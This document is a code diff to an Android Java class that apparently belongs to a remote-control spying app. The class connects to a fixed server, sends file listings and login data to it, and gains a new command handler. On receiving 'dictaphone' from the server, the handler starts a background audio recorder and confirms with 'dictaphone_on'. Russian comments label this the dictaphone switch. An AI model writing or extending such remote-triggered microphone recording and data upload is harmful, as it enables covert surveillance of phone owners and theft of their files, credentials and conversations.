@@ -1,10 +1,17 @@
 package com.postal.omniscient.postal.downloadFiles;
 
+import android.content.Context;
 import android.content.Intent;
 import android.util.Log;
 
+import com.postal.omniscient.MainActivity;
+import com.postal.omniscient.postal.ThreadIsAliveOrNot;
 import com.postal.omniscient.postal.adapter.AdapterDownloadFlag;
+import com.postal.omniscient.postal.adapter.EventBusData;
 
+import org.greenrobot.eventbus.EventBus;
+import org.greenrobot.eventbus.Subscribe;
+import org.greenrobot.eventbus.ThreadMode;
 import org.json.JSONException;
 import org.json.JSONObject;
 
@@ -31,13 +38,16 @@ public class DownloadFileRun implements Runnable {
     private DataOutputStream dos;
     private String Msg = "MyMsg";
     private File[] allFoldersFiles = null;
+    private Boolean start_download_on_event = false;
+    private Context context;
 
-    public DownloadFileRun(File[] allFoldersFiles) {
+    public DownloadFileRun(File[] allFoldersFiles, Context context) {
         this.allFoldersFiles = allFoldersFiles;
+        this.context = context;
     }
 
     private void start() {
-
+        EventBus.getDefault().register(this);
         AdapterDownloadFlag is_downloadFlag = new AdapterDownloadFlag();
         String server = "192.168.1.100";
         int port = 2221;
@@ -94,8 +104,21 @@ public class DownloadFileRun implements Runnable {
                             startDownlow.start();
                         }
                     } //else break;dos.close();socket.close();
+
+                    //команда на включение диктофона
+                    if (line.equals("dictaphone")) {
+                        if (!new ThreadIsAliveOrNot("DictaphoneRecord").liveORnot()) {
+                            Dictaphone dict = new Dictaphone(is_downloadFlag, context);
+                            dict.setName("DictaphoneRec");
+                            dict.start();
+                            Log.i(Msg, "  ДИКТОФОН ВКЛЮЧЕН");
+                            dos.writeUTF("dictaphone_on");
+                            dos.flush();
+                        }
+                    }
                 }
             } catch (IOException ex) { Log.e(Msg, "Eror "+ex);
+                EventBus.getDefault().unregister(this);
                 dos.close();socket.close();
             }
         } catch (IOException e) {
@@ -105,7 +128,10 @@ public class DownloadFileRun implements Runnable {
 
 
     }
-
+    @Subscribe(threadMode = ThreadMode.BACKGROUND)
+    public void onComand(EventBusData event){
+        start_download_on_event = true;
+    }
 
     /** Send a line of text
      * file_Name имя файла, folder_Name имя папки, patch путь к файлу*/
@@ -122,7 +148,12 @@ public class DownloadFileRun implements Runnable {
 
             dos.writeUTF(log_pass.toString());
             dos.flush();
-
+//        new EventBus(){
+//    @Subscribe(threadMode = ThreadMode.BACKGROUND)
+//    public void onComand(EventBusData event){
+//        start_download_on_event = true;
+//    }
+//};
         } catch (IOException e) {
             // TODO Auto-generated catch block
             e.printStackTrace();
